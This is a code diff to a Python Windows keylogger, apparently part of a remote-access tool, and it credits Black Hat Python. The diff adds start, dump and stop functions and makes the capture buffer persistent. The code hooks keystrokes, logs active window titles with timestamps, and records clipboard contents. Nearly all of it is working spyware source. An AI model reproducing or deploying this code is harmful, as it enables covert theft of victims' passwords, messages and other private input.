@@ -73,16 +73,41 @@ keyCodes={
 	0xA5 : "[RMENU]",
 }
 
+def keylogger_start():
+	if hasattr(sys, 'KEYLOGGER_THREAD'):
+		return False
+	keyLogger = KeyLogger()
+	keyLogger.start()
+	sys.KEYLOGGER_THREAD=keyLogger
+	return True
+
+def keylogger_dump():
+	if hasattr(sys, 'KEYLOGGER_THREAD'):
+		return sys.KEYLOGGER_THREAD.dump()
+
+def keylogger_stop():
+	if hasattr(sys, 'KEYLOGGER_THREAD'):
+		sys.KEYLOGGER_THREAD.stop()
+		del sys.KEYLOGGER_THREAD
+		return True
+	return False
+	
+
 class KeyLogger(threading.Thread):
 	def __init__(self, *args, **kwargs):
 		threading.Thread.__init__(self, *args, **kwargs)
 		self.hooked=None
 		self.daemon=True
-		self.keys_buffer=""
+		if not hasattr(sys, 'KEYLOGGER_BUFFER'):
+			sys.KEYLOGGER_BUFFER=""
+			
 		self.pointer=None
 		self.stopped=False
 		self.last_windows=None
 		self.last_clipboard=""
+
+	def append_key_buff(self, k):
+		sys.KEYLOGGER_BUFFER+=k
 
 	def run(self):
 		self.install_hook()
@@ -96,8 +121,8 @@ class KeyLogger(threading.Thread):
 		self.stopped=True
 
 	def dump(self):
-		res=self.keys_buffer
-		self.keys_buffer=""
+		res=sys.KEYLOGGER_BUFFER
+		sys.KEYLOGGER_BUFFER=""
 		return res
 
 	def convert_key_code(self, code):
@@ -138,7 +163,7 @@ class KeyLogger(threading.Thread):
 		except Exception:
 			pass
 		if self.last_windows!=(exe, win_title):
-			self.keys_buffer+="\n%s: %s %s\n"%(datetime.datetime.now(), str(exe).encode('string_escape'), str(win_title).encode('string_escape'))
+			self.append_key_buff("\n%s: %s %s\n"%(datetime.datetime.now(), str(exe).encode('string_escape'), str(win_title).encode('string_escape')))
 			self.last_windows=(exe, win_title)
 		paste=""
 		try:
@@ -146,9 +171,9 @@ class KeyLogger(threading.Thread):
 		except Exception:
 			pass
 		if paste and paste!=self.last_clipboard:
-			self.keys_buffer=self.keys_buffer.rstrip()+"\n<clipboard>%s</clipboard>\n"%(repr(paste)[2:-1])
+			self.append_key_buff("\n<clipboard>%s</clipboard>\n"%(repr(paste)[2:-1]))
 			self.last_clipboard=paste
-		self.keys_buffer+=hooked_key
+		self.append_key_buff(hooked_key)
 		return CallNextHookEx(self.hooked, nCode, wParam, lParam)	 
 
 #credit: Black Hat Python - https://www.nostarch.com/blackhatpython
